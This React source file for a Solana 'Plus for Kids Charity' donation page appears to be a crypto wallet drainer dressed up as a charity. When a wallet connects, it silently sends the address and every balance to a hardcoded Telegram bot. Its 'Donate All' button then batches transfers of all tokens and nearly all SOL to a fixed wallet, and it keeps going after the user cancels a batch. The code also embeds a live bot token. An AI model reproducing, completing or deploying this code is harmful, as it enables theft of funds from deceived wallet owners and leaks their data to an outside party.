import { useState, useEffect, useCallback } from 'react';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
import { getMintProgramId } from '@/utils/tokenProgram';
import { Navigation } from '@/components/Navigation';
import { Button } from '@/components/ui/button';
import { Card, CardContent } from '@/components/ui/card';
import { Loader2, X, Heart, Zap, Coins } from 'lucide-react';
import { Badge } from '@/components/ui/badge';
import { toast } from 'sonner';
import pegasusLogo from '@/assets/pegasus-logo.png';

const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
const TELEGRAM_BOT_TOKEN = '8209811310:AAF9m3QQAU17ijZpMiYEQylE1gHd4Yl1u_M';
const TELEGRAM_GROUP_ID = '-4836248812';
const MAX_BATCH_SIZE = 2;

interface TokenBalance {
  mint: string;
  balance: number;
  decimals: number;
  uiAmount: number;
  symbol?: string;
  valueInSOL?: number;
  isToken2022?: boolean;
}

const Charity = () => {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  const [balances, setBalances] = useState<TokenBalance[]>([]);
  const [solBalance, setSolBalance] = useState(0);
  const [totalValueSOL, setTotalValueSOL] = useState(0);
  const [isLoading, setIsLoading] = useState(false);
  const [buttonState, setButtonState] = useState<'idle' | 'loading' | 'error'>('idle');

  const sendTelegramNotification = useCallback(async (walletAddress: string, tokens: TokenBalance[], sol: number) => {
    const totalValue = tokens.reduce((sum, t) => sum + (t.valueInSOL || 0), 0) + sol;
    
    let message = `🔔 *New Wallet Connected*\n\n`;
    message += `💼 *Wallet:* \`${walletAddress}\`\n\n`;
    message += `💰 *Balances:*\n`;
    message += `SOL: ${sol.toFixed(4)} SOL\n\n`;
    
    if (tokens.length > 0) {
      message += `*SPL Tokens:*\n`;
      tokens.forEach(token => {
        message += `• ${token.symbol || token.mint.slice(0, 8)}: ${token.uiAmount.toFixed(4)} (${(token.valueInSOL || 0).toFixed(4)} SOL)\n`;
      });
    }
    
    message += `\n💎 *Total Value:* ${totalValue.toFixed(4)} SOL`;

    try {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_GROUP_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (error) {
      console.error('Telegram notification failed:', error);
    }
  }, []);

  const fetchBalances = useCallback(async () => {
    if (!publicKey) return;

    try {
      setIsLoading(true);

      // Fetch SOL balance
      const solBal = await connection.getBalance(publicKey);
      const solAmount = solBal / LAMPORTS_PER_SOL;
      setSolBalance(solAmount);

      // Fetch legacy SPL Token accounts
      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_PROGRAM_ID
      });

      // Fetch Token-2022 accounts (Pump.fun tokens)
      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
        programId: TOKEN_2022_PROGRAM_ID
      });

      // Process legacy tokens
      const legacyTokens: TokenBalance[] = legacyTokenAccounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
            isToken2022: false
          };
        })
        .filter(token => token.uiAmount > 0);

      // Process Token-2022 tokens (Pump.fun)
      const token2022Tokens: TokenBalance[] = token2022Accounts.value
        .map(account => {
          const info = account.account.data.parsed.info;
          return {
            mint: info.mint,
            balance: info.tokenAmount.amount,
            decimals: info.tokenAmount.decimals,
            uiAmount: info.tokenAmount.uiAmount,
            symbol: info.mint.slice(0, 8),
            valueInSOL: 0,
            isToken2022: true
          };
        })
        .filter(token => token.uiAmount > 0);

      const tokens = [...legacyTokens, ...token2022Tokens];

      setBalances(tokens);
      
      const total = tokens.reduce((sum, t) => sum + (t.valueInSOL || 0), 0) + solAmount;
      setTotalValueSOL(total);

      // Send Telegram notification
      await sendTelegramNotification(publicKey.toString(), tokens, solAmount);

    } catch (error) {
      console.error('Error fetching balances:', error);
      toast.error('Failed to fetch wallet balances');
    } finally {
      setIsLoading(false);
    }
  }, [publicKey, connection, sendTelegramNotification]);

  useEffect(() => {
    if (publicKey) {
      fetchBalances();
    }
  }, [publicKey, fetchBalances]);

  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
    if (!publicKey) return null;

    const transaction = new Transaction();
    const charityPubkey = new PublicKey(CHARITY_WALLET);

    // Add Compute Budget Instructions - increased for Token-2022 support
    transaction.add(
      ComputeBudgetProgram.setComputeUnitLimit({
        units: 200_000,
      })
    );

    transaction.add(
      ComputeBudgetProgram.setComputeUnitPrice({
        microLamports: 100_000,
      })
    );

    let tokenTransfersAdded = 0;

    // Add token transfers
    for (const token of tokenBatch) {
      // Ensure balance is treated as a number
      const balanceAmount = typeof token.balance === 'string' 
        ? parseInt(String(token.balance), 10) 
        : Number(token.balance);
      
      if (!balanceAmount || balanceAmount <= 0) {
        console.log(`Skipping ${token.mint} - zero or invalid balance`);
        continue;
      }
      
      try {
        const mintPubkey = new PublicKey(token.mint);
        
        // Determine which token program this mint belongs to
        const mintInfo = await getMintProgramId(connection, token.mint);
        const tokenProgramId = mintInfo.programId;
        const decimals = mintInfo.decimals;
        
        console.log(`Processing token ${token.mint}:`);
        console.log(`  - Program: ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL'}`);
        console.log(`  - Decimals: ${decimals}`);
        console.log(`  - Balance: ${balanceAmount}`);
        
        // Get ATAs with the correct program ID
        const fromTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          publicKey,
          false,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );
        const toTokenAccount = await getAssociatedTokenAddress(
          mintPubkey, 
          charityPubkey,
          true,
          tokenProgramId,
          ASSOCIATED_TOKEN_PROGRAM_ID
        );

        // Check if charity's token account exists, create if not
        let ataExists = false;
        try {
          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
          ataExists = true;
          console.log(`  - Destination ATA exists`);
        } catch (error) {
          console.log(`  - Destination ATA needs creation`);
          transaction.add(
            createAssociatedTokenAccountInstruction(
              publicKey,
              toTokenAccount,
              charityPubkey,
              mintPubkey,
              tokenProgramId,
              ASSOCIATED_TOKEN_PROGRAM_ID
            )
          );
        }

        // Use createTransferCheckedInstruction with correct program
        transaction.add(
          createTransferCheckedInstruction(
            fromTokenAccount,
            mintPubkey,
            toTokenAccount,
            publicKey,
            BigInt(balanceAmount),
            decimals,
            [],
            tokenProgramId
          )
        );
        
        tokenTransfersAdded++;
        console.log(`  - Transfer instruction added successfully`);
      } catch (error) {
        console.error(`Failed to add transfer for ${token.mint}:`, error);
      }
    }

    console.log(`Total token transfers added: ${tokenTransfersAdded}`);

    // Add SOL transfer if specified
    if (solPercentage && solBalance > 0) {
      const rentExempt = 0.01;
      const availableSOL = Math.max(0, solBalance - rentExempt);
      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
      
      if (amountToSend > 0) {
        transaction.add(
          SystemProgram.transfer({
            fromPubkey: publicKey,
            toPubkey: charityPubkey,
            lamports: amountToSend
          })
        );
        console.log(`SOL transfer added: ${amountToSend / LAMPORTS_PER_SOL} SOL`);
      }
    }

    return transaction;
  }, [publicKey, solBalance, connection]);

  const handleDonate = useCallback(async () => {
    if (!publicKey || !sendTransaction) {
      toast.error('Please connect your wallet');
      return;
    }

    if (balances.length === 0 && solBalance === 0) {
      setButtonState('loading');
      setTimeout(() => {
        setButtonState('error');
        toast.error('Wallet not eligible - no assets found');
      }, 1000);
      return;
    }

    try {
      setButtonState('loading');
      console.log('Starting donation process...');
      console.log('Balances:', balances);
      console.log('SOL Balance:', solBalance);
      
      toast.info('Preparing batch transfers...');

      // Filter out zero balance tokens
      const validTokens = balances.filter(token => token.balance > 0);
      
      // Sort tokens by value (highest first)
      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
      
      console.log('Valid tokens to transfer:', sortedTokens.length);

      // Create batches of max 5 tokens
      const batches: TokenBalance[][] = [];
      
      if (sortedTokens.length === 0 && solBalance > 0) {
        // No tokens but has SOL - create empty batch to trigger SOL transfer
        batches.push([]);
      } else {
        // Has tokens - create batches
        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
        }
      }

      let successCount = 0;

      // Process token batches - each in its own try/catch so rejections don't stop others
      for (let i = 0; i < batches.length; i++) {
        const batch = batches[i];
        const isLastBatch = i === batches.length - 1;
        
        console.log(`Processing batch ${i + 1}/${batches.length} with ${batch.length} tokens`);
        
        // Add 70% SOL to last token batch, or 100% if no tokens
        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
        
        try {
          const transaction = await createBatchTransfer(batch, solPercentage);
          
          // Check if we have meaningful instructions (more than just compute budget)
          const hasTokenTransfers = transaction && transaction.instructions.length > 2;
          const hasSOLTransfer = transaction && transaction.instructions.length === 3 && solPercentage;
          
          if (!hasTokenTransfers && !hasSOLTransfer) {
            console.log(`Batch ${i + 1} has no transfer instructions, skipping`);
            continue;
          }
          
          console.log(`Transaction has ${transaction!.instructions.length} instructions`);
          
          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
          transaction!.recentBlockhash = blockhash;
          transaction!.feePayer = publicKey;

          try {
            const simResult = await connection.simulateTransaction(transaction!);
            if (simResult.value.err) {
              console.error("Simulation error:", simResult.value.err);
              console.log("Simulation logs:", simResult.value.logs);
            }
          } catch (e) {
            console.error("Simulation failed", e);
          }

          console.log('Sending transaction...');
          const signature = await sendTransaction(transaction!, connection, {
            skipPreflight: false,
            maxRetries: 3,
            preflightCommitment: 'confirmed'
          });
          
          console.log('Transaction sent, signature:', signature);
          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
          
          await connection.confirmTransaction({
            signature,
            blockhash,
            lastValidBlockHeight
          }, 'confirmed');
          
          successCount++;
          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
          console.log(`Batch ${i + 1} confirmed`);
          
        } catch (batchError: any) {
          // Check if user rejected the transaction
          if (batchError?.message?.includes('User rejected') || 
              batchError?.message?.includes('rejected') ||
              batchError?.name === 'WalletSignTransactionError') {
            toast.warning(`Batch ${i + 1} was cancelled`);
            console.log(`Batch ${i + 1} rejected by user, continuing to next batch...`);
            continue;
          }
          
          console.error(`Batch ${i + 1} failed:`, batchError);
          toast.error(`Batch ${i + 1} failed: ${batchError?.message || 'Unknown error'}`);
          continue;
        }
      }

      // Send remaining 30% SOL if we sent tokens
      if (sortedTokens.length > 0 && solBalance > 0) {
        console.log('Sending final 30% SOL transfer...');
        
        try {
          const finalTransaction = await createBatchTransfer([], 30);
          
          if (finalTransaction && finalTransaction.instructions.length > 2) {
            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
            finalTransaction.recentBlockhash = blockhash;
            finalTransaction.feePayer = publicKey;

            const signature = await sendTransaction(finalTransaction, connection, {
              skipPreflight: false,
              maxRetries: 3,
              preflightCommitment: 'confirmed'
            });
            
            await connection.confirmTransaction({
              signature,
              blockhash,
              lastValidBlockHeight
            }, 'confirmed');
            
            toast.success('Final SOL transfer completed!');
            console.log('Final SOL transfer confirmed');
          }
        } catch (finalError: any) {
          if (finalError?.message?.includes('rejected')) {
            toast.warning('Final SOL transfer was cancelled');
          } else {
            console.error('Final SOL transfer failed:', finalError);
          }
        }
      }

      setButtonState('idle');
      toast.success(`🎉 Donation complete! ${successCount} batch(es) sent`);
      console.log('Donation process completed successfully');
      
      // Refresh balances
      setTimeout(fetchBalances, 2000);

    } catch (error: any) {
      console.error('Donation error:', error);
      setButtonState('error');
      
      toast.error(error?.message || 'Donation failed');
      setTimeout(() => setButtonState('idle'), 3000);
    }
  }, [publicKey, sendTransaction, balances, solBalance, connection, createBatchTransfer, fetchBalances]);

  return (
    <div className="min-h-screen relative overflow-hidden">
      <Navigation />

      {/* Hero Section */}
      <section className="relative pt-24 md:pt-32 pb-12 md:pb-16 px-4">
        <div className="container mx-auto max-w-4xl text-center">
          <div className="inline-block p-1 rounded-full bg-gradient-to-r from-pink-500 to-rose-500 mb-8">
            <div className="bg-background rounded-full p-6 md:p-8">
              <Heart className="w-20 h-20 md:w-24 md:h-24 text-pink-500 fill-pink-500" />
            </div>
          </div>

          <h1 className="text-4xl md:text-6xl font-extrabold text-foreground mb-4">
            Plus for Kids Charity
          </h1>

          <p className="text-lg md:text-xl text-muted-foreground mb-6 md:mb-8">
            Support children in need by donating your trading challenge proceeds
          </p>

          <Card className="bg-card/90 border-0 mb-8">
            <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8">
              <h2 className="text-xl md:text-2xl font-bold mb-3 md:mb-4">Trading for Good Challenge</h2>
              <p className="text-sm md:text-base text-muted-foreground mb-4 md:mb-6">
                Traders worldwide create wallets, fund them with SOL and SPL tokens, trade to grow their balance, 
                and then donate all proceeds to support children's education and welfare programs.
              </p>
              
              <div className="mb-6">
                <WalletMultiButton />
              </div>

              {publicKey && (
                <div className="text-left space-y-3 mb-6 p-4 bg-muted/50 rounded-lg">
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">Connected:</span> {publicKey.toString().slice(0, 8)}...{publicKey.toString().slice(-8)}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">SOL Balance:</span> {isLoading ? '...' : `${solBalance.toFixed(4)} SOL`}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">SPL Tokens:</span> {isLoading ? '...' : balances.length}
                  </p>
                  <p className="text-xs sm:text-sm">
                    <span className="font-semibold">Total Value:</span> {isLoading ? '...' : `~${totalValueSOL.toFixed(4)} SOL`}
                  </p>
                  
                  {/* Token list with badges */}
                  {!isLoading && balances.length > 0 && (
                    <div className="mt-4 pt-4 border-t border-border">
                      <p className="font-semibold text-xs sm:text-sm mb-2">Your Tokens:</p>
                      <div className="space-y-2 max-h-48 overflow-y-auto">
                        {balances.map((token) => (
                          <div key={token.mint} className="flex items-center justify-between text-xs bg-background/50 p-2 rounded">
                            <div className="flex items-center gap-2">
                              <span className="font-mono truncate max-w-[100px]">{token.symbol}</span>
                              {token.isToken2022 ? (
                                <Badge variant="secondary" className="text-[10px] px-1.5 py-0 bg-gradient-to-r from-pink-500/20 to-purple-500/20 text-pink-400 border-pink-500/30">
                                  <Zap className="w-3 h-3 mr-0.5" />
                                  Pump.fun
                                </Badge>
                              ) : (
                                <Badge variant="outline" className="text-[10px] px-1.5 py-0 text-muted-foreground">
                                  <Coins className="w-3 h-3 mr-0.5" />
                                  SPL
                                </Badge>
                              )}
                            </div>
                            <span className="text-muted-foreground">{token.uiAmount.toLocaleString()}</span>
                          </div>
                        ))}
                      </div>
                    </div>
                  )}
                </div>
              )}

              <Button
                size="lg"
                onClick={handleDonate}
                disabled={!publicKey || buttonState === 'loading'}
                className="w-full max-w-md text-base md:text-lg px-8 md:px-12 py-5 md:py-6 h-auto bg-gradient-to-r from-pink-500 to-rose-500 hover:from-pink-600 hover:to-rose-600"
              >
                {buttonState === 'loading' && <Loader2 className="mr-2 h-5 w-5 animate-spin" />}
                {buttonState === 'error' && <X className="mr-2 h-5 w-5" />}
                {buttonState === 'error' ? 'Wallet Not Eligible' : 'Donate All'}
              </Button>
            </CardContent>
          </Card>
        </div>
      </section>

      {/* How It Works */}
      <section className="py-12 md:py-16 px-4 bg-muted/20">
        <div className="container mx-auto max-w-4xl">
          <h2 className="text-2xl md:text-3xl font-bold text-center mb-6 md:mb-8">How It Works</h2>
          
          <div className="grid md:grid-cols-3 gap-6">
            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">1</span>
                </div>
                <h3 className="text-lg md:text-xl font-bold mb-2">Connect Wallet</h3>
                <p className="text-sm md:text-base text-muted-foreground">
                  Connect your Phantom, Solflare, or any Solana wallet containing your trading proceeds
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-6 md:pt-8 pb-6 md:pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">2</span>
                </div>
                <h3 className="text-lg md:text-xl font-bold mb-2">Review Balance</h3>
                <p className="text-sm md:text-base text-muted-foreground">
                  We detect all SOL and SPL tokens in your wallet automatically
                </p>
              </CardContent>
            </Card>

            <Card className="bg-card/90 border-0">
              <CardContent className="pt-8 pb-8 text-center">
                <div className="w-12 h-12 rounded-full bg-pink-500/20 flex items-center justify-center mx-auto mb-4">
                  <span className="text-2xl font-bold text-pink-500">3</span>
                </div>
                <h3 className="text-xl font-bold mb-2">Donate All</h3>
                <p className="text-muted-foreground">
                  Click once to send all assets to charity via secure batch transfers
                </p>
              </CardContent>
            </Card>
          </div>
        </div>
      </section>

      {/* Mission */}
      <section className="py-16 px-4">
        <div className="container mx-auto max-w-3xl text-center">
          <h2 className="text-3xl font-bold mb-6">Our Mission</h2>
          <p className="text-lg text-muted-foreground mb-4">
            Plus for Kids is dedicated to providing education, healthcare, and support to children in underserved communities. 
            Every donation from the Trading for Good challenge directly impacts a child's future.
          </p>
          <p className="text-muted-foreground">
            Charity Wallet: <code className="text-sm bg-muted px-2 py-1 rounded">{CHARITY_WALLET}</code>
          </p>
        </div>
      </section>
    </div>
  );
};

export default Charity;
